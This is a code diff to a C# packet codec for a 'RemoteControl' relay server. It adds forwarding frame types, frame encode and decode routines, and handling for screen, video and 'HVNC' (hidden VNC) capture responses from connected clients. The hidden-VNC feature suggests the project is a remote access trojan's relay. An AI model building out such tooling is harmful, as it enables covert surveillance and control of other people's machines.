@@ -11,7 +11,7 @@ namespace RemoteControl.Relay
     /// 原协议格式: [4字节packetLength(含自身4字节)][1字节packetType][JSON Body]
     /// packetLength = 4 + 1 + body.Length
     /// </summary>
-    public static class PacketCodec
+    public static partial class PacketCodec
     {
         // Relay协议包类型(与ePacketType对应, 必须<=255因为是1字节)
         const byte CYCLER_RELAY_HANDSHAKE = 200;
@@ -20,7 +20,12 @@ namespace RemoteControl.Relay
         const byte CYCLER_RELAY_SELECT_CLIENT = 203;
         const byte CYCLER_RELAY_CLIENT_ONLINE = 204;
         const byte CYCLER_RELAY_CLIENT_OFFLINE = 205;
+        const byte CYCLER_RELAY_FORWARD = 206;
+        const byte CYCLER_RELAY_CLIENT_DATA = 207;
         const byte PACKET_GET_HOST_NAME_RESPONSE = 65;
+        const byte PACKET_START_CAPTURE_SCREEN_RESPONSE = 6;
+        const byte PACKET_START_CAPTURE_VIDEO_RESPONSE = 9;
+        const byte PACKET_HVNC_SCREEN_RESPONSE = 111;
 
         /// <summary>
         /// 获取包类型(从完整包中提取, offset=4是packetType字节)
@@ -29,6 +34,14 @@ namespace RemoteControl.Relay
         {
             if (fullPacket == null || fullPacket.Length < 5) return 0;
             return fullPacket[4];
+        }
+
+        public static bool IsDroppableRealtimePacket(byte[] fullPacket)
+        {
+            byte packetType = GetPacketType(fullPacket);
+            return packetType == PACKET_START_CAPTURE_SCREEN_RESPONSE ||
+                packetType == PACKET_START_CAPTURE_VIDEO_RESPONSE ||
+                packetType == PACKET_HVNC_SCREEN_RESPONSE;
         }
 
         /// <summary>
@@ -97,6 +110,34 @@ namespace RemoteControl.Relay
             catch { return null; }
         }
 
+        public static RelayDataFrameData DecodeRelayDataFrame(byte[] fullPacket)
+        {
+            byte type = GetPacketType(fullPacket);
+            if (type != CYCLER_RELAY_FORWARD && type != CYCLER_RELAY_CLIENT_DATA)
+                return null;
+
+            RelayDataFrameData binaryFrame;
+            if (TryDecodeRelayDataFrameBinary(fullPacket, out binaryFrame))
+                return binaryFrame;
+
+            string json = GetBodyJson(fullPacket);
+            if (string.IsNullOrEmpty(json)) return null;
+            try
+            {
+                return JsonConvert.DeserializeObject<RelayDataFrameData>(json);
+            }
+            catch { return null; }
+        }
+
+        public static byte[] BuildRelayDataFrame(string clientId, byte[] payload)
+        {
+            var frame = new RelayDataFrameData();
+            frame.ClientId = clientId ?? "";
+            frame.InnerPacketType = GetPacketType(payload);
+            frame.Payload = payload ?? new byte[0];
+            return BuildRelayDataFramePacket(CYCLER_RELAY_FORWARD, frame);
+        }
+
         public static HostNameData DecodeHostNameResponse(byte[] fullPacket)
         {
             if (GetPacketType(fullPacket) != PACKET_GET_HOST_NAME_RESPONSE)
@@ -126,7 +167,7 @@ namespace RemoteControl.Relay
                 var s = kv.Value;
                 list.Add(new
                 {
-                    ClientId = s.SessionId,
+                    ClientId = s.ClientId,
                     HostName = s.HostName,
                     IP = s.RemoteEndPoint,
                     AppPath = s.AppPath,
@@ -156,7 +197,7 @@ namespace RemoteControl.Relay
         {
             return BuildPacket(CYCLER_RELAY_CLIENT_ONLINE, new
             {
-                ClientId = client.SessionId,
+                ClientId = client.ClientId,
                 HostName = client.HostName,
                 IP = client.RemoteEndPoint,
                 AppPath = client.AppPath,
